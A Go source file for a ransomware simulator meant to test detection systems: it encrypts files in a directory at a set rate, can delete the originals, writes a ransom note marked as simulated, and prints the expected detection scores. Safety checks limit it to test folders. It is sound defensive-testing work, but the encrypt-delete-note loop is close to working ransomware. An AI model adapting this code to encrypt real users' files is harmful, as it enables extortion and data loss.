package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// FileEncryptor encrypts files using pluggable crypto modules
type FileEncryptor struct {
	targetDir      string
	filesPerSecond int
	algorithm      string
	password       string
	deleteOriginal bool
	createNote     bool
	cryptoModule   CryptoModule
	pattern        string // File pattern to encrypt (e.g., "*.txt", "*")
}

func main() {
	enc := &FileEncryptor{}

	flag.StringVar(&enc.targetDir, "dir", "", "Target directory containing files to encrypt (REQUIRED)")
	flag.IntVar(&enc.filesPerSecond, "rate", 50, "Files per second (encryption velocity)")
	flag.StringVar(&enc.algorithm, "algorithm", "aes", "Encryption algorithm (aes, pseudo-random, xor)")
	flag.StringVar(&enc.password, "password", "", "Password for key derivation (if applicable)")
	flag.BoolVar(&enc.deleteOriginal, "delete-original", false, "Delete original files after encryption")
	flag.BoolVar(&enc.createNote, "ransom-note", true, "Create ransom note")
	flag.StringVar(&enc.pattern, "pattern", "*", "File pattern to encrypt (e.g., '*.txt', 'file_*')")

	listModules := flag.Bool("list-modules", false, "List available encryption modules")

	flag.Parse()

	// List modules and exit
	if *listModules {
		fmt.Println("Available Encryption Modules:")
		fmt.Println("=============================")
		for _, module := range ListAvailableModules() {
			fmt.Printf("  %s\n", module)
		}
		fmt.Println()
		fmt.Println("Example usage:")
		fmt.Println("  file_encryptor.exe -dir C:\\test -algorithm aes -password mySecretKey")
		return
	}

	if enc.targetDir == "" {
		log.Fatal("ERROR: -dir flag is required. Specify directory containing files to encrypt.")
	}

	// Safety check
	if !isSafeDirectory(enc.targetDir) {
		log.Fatalf("ERROR: Directory '%s' is not safe. Use an isolated test directory.", enc.targetDir)
	}

	// Initialize crypto module
	cryptoModule, err := GetCryptoModule(enc.algorithm, enc.password)
	if err != nil {
		log.Fatalf("ERROR: Failed to initialize crypto module: %v", err)
	}
	enc.cryptoModule = cryptoModule

	fmt.Println("╔════════════════════════════════════════════════════════════╗")
	fmt.Println("║              FILE ENCRYPTOR v1.0                           ║")
	fmt.Println("║        FOR RANSOMWARE TESTING - PART 2 OF 2                ║")
	fmt.Println("╚════════════════════════════════════════════════════════════╝")
	fmt.Println()
	fmt.Printf("Target Directory: %s\n", enc.targetDir)
	fmt.Printf("Encryption Rate: %d files/sec (%.0f files/min)\n", enc.filesPerSecond, float64(enc.filesPerSecond)*60)
	fmt.Printf("Algorithm: %s\n", enc.cryptoModule.GetName())
	fmt.Printf("Extension: %s\n", enc.cryptoModule.GetFileExtension())
	fmt.Printf("Delete Original: %v\n", enc.deleteOriginal)
	fmt.Printf("Pattern: %s\n", enc.pattern)
	fmt.Println()

	if enc.deleteOriginal {
		fmt.Println("⚠️  WARNING: Original files will be DELETED after encryption!")
		fmt.Println()
	}

	// Confirm execution
	fmt.Print("Continue? (yes/no): ")
	var confirm string
	fmt.Scanln(&confirm)
	if confirm != "yes" {
		log.Fatal("Operation cancelled")
	}

	enc.Run()
}

func (enc *FileEncryptor) Run() {
	startTime := time.Now()

	fmt.Println("\n[*] Starting file encryption...")
	fmt.Printf("[*] PID: %d\n", os.Getpid())
	fmt.Println()

	// Find files to encrypt
	files, err := enc.findFiles()
	if err != nil {
		log.Fatalf("ERROR: Failed to find files: %v", err)
	}

	if len(files) == 0 {
		log.Printf("No files found matching pattern '%s' in %s", enc.pattern, enc.targetDir)
		return
	}

	fmt.Printf("[*] Found %d files to encrypt\n\n", len(files))

	// Encrypt files
	filesEncrypted := 0
	filesDeleted := 0

	// Calculate delay between operations
	delayNS := time.Second / time.Duration(enc.filesPerSecond)

	for i, filePath := range files {
		// Skip already encrypted files
		if strings.HasSuffix(filePath, enc.cryptoModule.GetFileExtension()) {
			continue
		}

		// Encrypt file
		encryptedPath, err := enc.encryptFile(filePath)
		if err != nil {
			log.Printf("[!] Failed to encrypt %s: %v", filepath.Base(filePath), err)
			continue
		}

		filesEncrypted++

		// Delete original if requested
		if enc.deleteOriginal {
			if err := os.Remove(filePath); err != nil {
				log.Printf("[!] Failed to delete original %s: %v", filepath.Base(filePath), err)
			} else {
				filesDeleted++
			}
		}

		// Progress indicator
		if (i+1)%20 == 0 || (i+1) == len(files) {
			elapsed := time.Since(startTime)
			rate := float64(filesEncrypted) / elapsed.Seconds() * 60
			fmt.Printf("[*] Encrypted: %d/%d files (%.0f files/min) - %s\n",
				filesEncrypted, len(files), rate, filepath.Base(encryptedPath))
		}

		// Rate limiting
		time.Sleep(delayNS)
	}

	// Create ransom note
	if enc.createNote {
		enc.createRansomNote(filesEncrypted)
	}

	// Print summary
	duration := time.Since(startTime)
	enc.printSummary(filesEncrypted, filesDeleted, duration)
}

func (enc *FileEncryptor) findFiles() ([]string, error) {
	var files []string

	// Build glob pattern
	pattern := filepath.Join(enc.targetDir, enc.pattern)

	matches, err := filepath.Glob(pattern)
	if err != nil {
		return nil, err
	}

	// Filter out directories and encrypted files
	for _, match := range matches {
		info, err := os.Stat(match)
		if err != nil {
			continue
		}

		if info.IsDir() {
			continue
		}

		// Skip already encrypted files
		if strings.HasSuffix(match, enc.cryptoModule.GetFileExtension()) {
			continue
		}

		files = append(files, match)
	}

	return files, nil
}

func (enc *FileEncryptor) encryptFile(filePath string) (string, error) {
	// Read original file
	plaintext, err := os.ReadFile(filePath)
	if err != nil {
		return "", fmt.Errorf("failed to read file: %w", err)
	}

	// Encrypt content
	ciphertext, err := enc.cryptoModule.Encrypt(plaintext)
	if err != nil {
		return "", fmt.Errorf("failed to encrypt: %w", err)
	}

	// Generate encrypted file path
	encryptedPath := filePath + enc.cryptoModule.GetFileExtension()

	// Write encrypted file (new file, not replacing original)
	if err := os.WriteFile(encryptedPath, ciphertext, 0644); err != nil {
		return "", fmt.Errorf("failed to write encrypted file: %w", err)
	}

	return encryptedPath, nil
}

func (enc *FileEncryptor) createRansomNote(filesEncrypted int) {
	note := fmt.Sprintf(`╔════════════════════════════════════════════════════════════╗
║              YOUR FILES HAVE BEEN ENCRYPTED                 ║
╚════════════════════════════════════════════════════════════╝

This is a SIMULATED ransom note for testing detection systems.

Your files have been encrypted with %s.

[THIS IS A TEST - FILES CAN BE RECOVERED]

Encryption Details:
  - Algorithm: %s
  - Files Encrypted: %d
  - Extension: %s
  - Encryption Date: %s

[FOR TESTING PURPOSES ONLY]
[SIMULATION ID: %d]

To decrypt files (for testing):
  1. Stop the simulator
  2. Use the decryption tool with the same password
  3. Or restore from backup

WARNING: This is a test simulation. In a real ransomware attack:
  - Files would be permanently encrypted
  - Recovery would require payment
  - Data could be lost forever

Always maintain secure backups!
`,
		enc.cryptoModule.GetName(),
		enc.cryptoModule.GetName(),
		filesEncrypted,
		enc.cryptoModule.GetFileExtension(),
		time.Now().Format(time.RFC3339),
		time.Now().Unix(),
	)

	notePath := filepath.Join(enc.targetDir, "README-DECRYPT.txt")
	os.WriteFile(notePath, []byte(note), 0644)
	fmt.Printf("\n[*] Created ransom note: %s\n", notePath)
}

func (enc *FileEncryptor) printSummary(filesEncrypted int, filesDeleted int, duration time.Duration) {
	actualRate := float64(filesEncrypted) / duration.Seconds() * 60

	fmt.Println()
	fmt.Println("╔════════════════════════════════════════════════════════════╗")
	fmt.Println("║              ENCRYPTION COMPLETE                           ║")
	fmt.Println("╚════════════════════════════════════════════════════════════╝")
	fmt.Printf("Files Encrypted: %d\n", filesEncrypted)
	fmt.Printf("Files Deleted: %d\n", filesDeleted)
	fmt.Printf("Duration: %v\n", duration)
	fmt.Printf("Actual Rate: %.0f files/min (%.0f files/sec)\n", actualRate, actualRate/60)
	fmt.Printf("Algorithm: %s\n", enc.cryptoModule.GetName())
	fmt.Printf("Extension: %s\n", enc.cryptoModule.GetFileExtension())
	fmt.Printf("Target Directory: %s\n", enc.targetDir)
	fmt.Println()

	// Detection indicators
	fmt.Println("╔════════════════════════════════════════════════════════════╗")
	fmt.Println("║            EXPECTED DETECTION INDICATORS                   ║")
	fmt.Println("╚════════════════════════════════════════════════════════════╝")

	if actualRate >= 100 {
		fmt.Printf("✓ HIGH I/O Velocity: %.0f files/min (Threshold: 100)\n", actualRate)
		fmt.Println("  Severity: HIGH (30 points)")
	} else if actualRate >= 50 {
		fmt.Printf("✓ MEDIUM I/O Velocity: %.0f files/min (Threshold: 50)\n", actualRate)
		fmt.Println("  Severity: MEDIUM (requires correlation)")
	}

	fmt.Println("✓ High Entropy Files: Real encrypted data (AES-256-GCM)")
	fmt.Println("  Severity: HIGH (25 points)")

	fmt.Printf("✓ Ransomware Extension: %s files detected\n", enc.cryptoModule.GetFileExtension())
	fmt.Println("  Severity: HIGH (20 points)")

	if enc.deleteOriginal && filesDeleted > 0 {
		fmt.Println("✓ Original Files Deleted: File delete events triggered")
		fmt.Println("  Severity: HIGH (Stage 3 detection)")
	}

	totalScore := 0
	if actualRate >= 100 {
		totalScore += 30
	}
	totalScore += 25 // High entropy (real encryption)
	totalScore += 20 // Extension

	fmt.Println()
	fmt.Printf("TOTAL THREAT SCORE: %d points\n", totalScore)

	threshold := 50
	if totalScore >= threshold {
		fmt.Printf("THREAT LEVEL: CRITICAL (Score ≥ %d → Auto-Terminate)\n", threshold)
		fmt.Println("EXPECTED ACTION: Process terminated, files quarantined")
	} else if totalScore >= 31 {
		fmt.Println("THREAT LEVEL: MEDIUM (Alert generated)")
		fmt.Println("EXPECTED ACTION: Analyst review")
	} else {
		fmt.Println("THREAT LEVEL: LOW")
		fmt.Println("EXPECTED ACTION: No automated response")
	}
	fmt.Println()

	// File operation summary
	fmt.Println("╔════════════════════════════════════════════════════════════╗")
	fmt.Println("║              FILE OPERATION SUMMARY                        ║")
	fmt.Println("╚════════════════════════════════════════════════════════════╝")

	if enc.deleteOriginal {
		fmt.Println("Operation Mode: DESTRUCTIVE")
		fmt.Printf("  - Created %d encrypted files (%s)\n", filesEncrypted, enc.cryptoModule.GetFileExtension())
		fmt.Printf("  - Deleted %d original files\n", filesDeleted)
		fmt.Println("  - Simulates real ransomware behavior")
	} else {
		fmt.Println("Operation Mode: NON-DESTRUCTIVE")
		fmt.Printf("  - Created %d encrypted files (%s)\n", filesEncrypted, enc.cryptoModule.GetFileExtension())
		fmt.Println("  - Original files preserved")
		fmt.Println("  - Safe testing mode")
	}
	fmt.Println()
}

func isSafeDirectory(dir string) bool {
	unsafePaths := []string{
		"C:\\Windows",
		"C:\\Program Files",
		"C:\\Users",
		os.Getenv("USERPROFILE"),
		os.Getenv("APPDATA"),
		os.Getenv("TEMP"),
	}

	absDir, _ := filepath.Abs(dir)

	for _, unsafePath := range unsafePaths {
		if unsafePath != "" && strings.HasPrefix(absDir, unsafePath) {
			return false
		}
	}

	dirLower := strings.ToLower(filepath.ToSlash(absDir))
	if !strings.Contains(dirLower, "test") &&
		!strings.Contains(dirLower, "sim") &&
		!strings.Contains(dirLower, "demo") &&
		!strings.Contains(dirLower, "malware") {
		return false
	}

	return true
}
